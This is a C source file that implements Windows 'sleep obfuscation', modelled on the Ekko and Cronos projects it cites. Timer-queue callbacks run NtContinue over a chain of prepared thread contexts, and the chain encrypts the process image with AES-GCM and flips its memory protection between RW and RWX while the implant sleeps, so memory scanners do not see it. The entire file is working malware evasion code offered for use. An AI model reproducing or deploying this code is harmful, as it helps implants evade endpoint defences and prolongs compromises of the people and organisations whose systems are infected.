#include "box.h"
#include "Aes.h"

// https://binarydefense.com/resources/blog/understanding-sleep-obfuscation/
// https://dtsec.us/2023-04-24-Sleep/
// https://github.com/Cracked5pider/Ekko/tree/main
// https://github.com/Idov31/Cronos

VOID CopyFromPtr
(
	IN PVOID Dst,
	IN PBYTE* Src,
	IN DWORD* Size
)
{
	RtlCopyMemory(Dst, *Src, *Size);
}

VOID SleepObfusc
(
	IN PLARGE_INTEGER SleepTime
)
{


	pWinApi Api = { 0 };
	Api = (pWinApi)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WinApi));
	DWORD dwOldProt = 0;
	DWORD AesKeyLen = 0;
	PBYTE AesKey = 0;

	PBYTE EncryptedData = 0, DecryptedData = 0, Tag = 0;
	DWORD EncryptedSize = 0, DecryptedSize = 0, Delay = 0;

	Api->NtSetEvent = GetProcAddress(GetModuleHandleA("ntdll"), "NtSetEvent");
	Api->NtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
	Api->NtWaitForSingleObject = GetProcAddress(GetModuleHandleA("ntdll"), "NtWaitForSingleObject");
	Api->VirtualProtect = GetProcAddress(GetModuleHandleA("kernel32"), "VirtualProtect");
	Api->RtlCopyMemory = GetProcAddress(GetModuleHandleA("ntdll"), "RtlCopyMemory");

	CONTEXT CtxThread = { 0 };
	CONTEXT Rop[10] = { 0 };
	PBYTE StackBuffer[10];
	CtxThread.ContextFlags = CONTEXT_FULL;
	GetThreadContext(GetCurrentThread(), &CtxThread);

	HANDLE hNewTimer = NULL;
	HANDLE	hEvent = CreateEventW(0, 0, 0, 0);
	HANDLE	hTimerQueue = CreateTimerQueue();

	LARGE_INTEGER timeout;
	timeout.QuadPart = -(50 * 10000);

	PVOID pBase = GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);

	PVOID ImageBase = pImgNt64->OptionalHeader.ImageBase;
	PVOID ImageLen = pImgNt64->OptionalHeader.SizeOfImage;

	for (int i = 0; i < 10; i++)
	{
		StackBuffer[i] = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
	}

	for (int i = 0; i < 10; i++)
	{
		memcpy(&Rop[i], &CtxThread, sizeof(CONTEXT));
		Rop[i].Rsp = (DWORD64)StackBuffer[i];
		Rop[i].Rsp -= 8;
	}

	AesGenKey(&AesKey, &AesKeyLen);
	if (AesKeyLen == 0)
	{
		return;
	}

	if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
	{

		Rop[0].Rip = Api->NtWaitForSingleObject;
		Rop[0].Rcx = hEvent;
		Rop[0].Rdx = FALSE;
		Rop[0].R8 = &timeout;

		Rop[1].Rip = Api->VirtualProtect;
		Rop[1].Rcx = ImageBase;
		Rop[1].Rdx = ImageLen;
		Rop[1].R8  = PAGE_READWRITE;
		Rop[1].R9  = &dwOldProt;

		INFO("Changing Protection --> RW");

		Rop[2].Rip = AesEncrypt;
		Rop[2].Rcx = ImageBase;
		Rop[2].Rdx = ImageLen;
		Rop[2].R8 = &EncryptedSize;
		Rop[2].R9 = AesKey;
		*(DWORD64*)(StackBuffer[2] + 0x20) = (DWORD64)&Tag;
		*(DWORD64*)(StackBuffer[2] + 0x28) = (DWORD64)&EncryptedData;

		INFO("Encrypting Via Aes-256-GCM");

		Rop[3].Rip = CopyFromPtr;
		Rop[3].Rcx = ImageBase;
		Rop[3].Rdx = &EncryptedData;
		Rop[3].R8 = &EncryptedSize;

		Rop[4].Rip = Api->NtWaitForSingleObject;
		Rop[4].Rcx = hEvent;
		Rop[4].Rdx = FALSE;
		Rop[4].R8 = SleepTime;

		OKAY("Waiting For %lld", SleepTime->QuadPart);

		Rop[5].Rip = AesDecrypt;
		Rop[5].Rcx = &EncryptedData;
		Rop[5].Rdx = &EncryptedSize;
		Rop[5].R8 = &Tag;
		Rop[5].R9 = 16;
		*(DWORD64*)(StackBuffer[5] + 0x20) = (DWORD64)AesKey;
		*(DWORD64*)(StackBuffer[5] + 0x28) = (DWORD64)&DecryptedSize;
		*(DWORD64*)(StackBuffer[5] + 0x30) = (DWORD64)&DecryptedData;

		INFO("Decrypting Payload...");

		Rop[6].Rip = CopyFromPtr;
		Rop[6].Rcx = ImageBase;
		Rop[6].Rdx = &DecryptedData;
		Rop[6].R8 = &DecryptedSize;

		Rop[7].Rip = Api->VirtualProtect;
		Rop[7].Rcx = ImageBase;
		Rop[7].Rdx = ImageLen;
		Rop[7].R8 = PAGE_EXECUTE_READWRITE;
		Rop[7].R9 = &dwOldProt;

		INFO("Changing Protection --> RWX");

		Rop[8].Rip = Api->NtSetEvent;
		Rop[8].Rcx = hEvent;
		Rop[8].Rdx = NULL;

		INFO("Creating Timers");

		for (int i = 0; i < 9; i++)
		{
			CreateTimerQueueTimer(&hNewTimer, hTimerQueue, Api->NtContinue, &Rop[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
		}

		INFO("Waiting...");

		Api->NtWaitForSingleObject(hEvent, FALSE, NULL);

		OKAY("Finished!");

	}

	DeleteTimerQueue(hTimerQueue);

}